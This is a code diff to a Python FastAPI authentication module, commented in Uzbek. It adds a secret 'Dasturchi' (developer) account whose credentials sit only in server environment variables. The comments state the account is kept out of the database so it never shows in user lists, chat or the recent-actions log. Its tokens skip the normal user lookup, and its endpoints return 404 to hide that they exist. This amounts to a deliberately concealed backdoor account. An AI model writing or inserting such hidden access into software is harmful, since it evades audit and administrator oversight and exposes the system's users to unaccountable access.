@@ -130,16 +130,54 @@ def decode_access_token(token: str) -> dict:
         )
 
 
+# ---------- v13.26: DASTURCHI (yashirin) ----------
+# Maxfiy login/parol SERVERDAGI .env da (DEV_LOGIN, DEV_PASSWORD_HASH). Bazada YO'Q —
+# shuning uchun foydalanuvchilar ro'yxatida, chatda, "Oxirgi amallar"da hech qachon ko'rinmaydi.
+ROLE_DEV = "Dasturchi"
+DEV_LOGIN = (os.getenv("DEV_LOGIN") or "").strip()
+DEV_PASSWORD_HASH = (os.getenv("DEV_PASSWORD_HASH") or "").strip()
+
+
+def is_dev_login(username: str) -> bool:
+    return bool(DEV_LOGIN) and (username or "").strip() == DEV_LOGIN
+
+
+def dev_login_ok(username: str, password: str) -> bool:
+    if not is_dev_login(username) or not DEV_PASSWORD_HASH:
+        return False
+    try:
+        return verify_password(password or "", DEV_PASSWORD_HASH)
+    except Exception:  # noqa: BLE001
+        return False
+
+
+def _dev_user() -> "models.User":
+    """Bazaga YOZILMAYDIGAN vaqtinchalik dasturchi 'foydalanuvchi' obyekti."""
+    u = models.User(username=DEV_LOGIN, role=ROLE_DEV)
+    u.id = -1
+    u.teacher_id = None
+    return u
+
+
 def get_current_user(
     credentials: HTTPAuthorizationCredentials = Depends(bearer_scheme),
     db: Session = Depends(get_db),
 ) -> models.User:
     payload = decode_access_token(credentials.credentials)
     username: Optional[str] = payload.get("sub")
+    # Dasturchi tokeni — bazada qidirilmaydi (bazada yo'q)
+    if payload.get("role") == ROLE_DEV and is_dev_login(username or ""):
+        return _dev_user()
     user = db.query(models.User).filter(models.User.username == username).first()
     if not user:
         raise HTTPException(status_code=401, detail="Foydalanuvchi topilmadi.")
     return user
+
+
+def require_dev(current_user: models.User = Depends(get_current_user)) -> models.User:
+    if current_user.role != ROLE_DEV:
+        raise HTTPException(status_code=404, detail="Not found")  # borligini ham bildirmaymiz
+    return current_user
 
 
 def require_rahbar(current_user: models.User = Depends(get_current_user)) -> models.User:
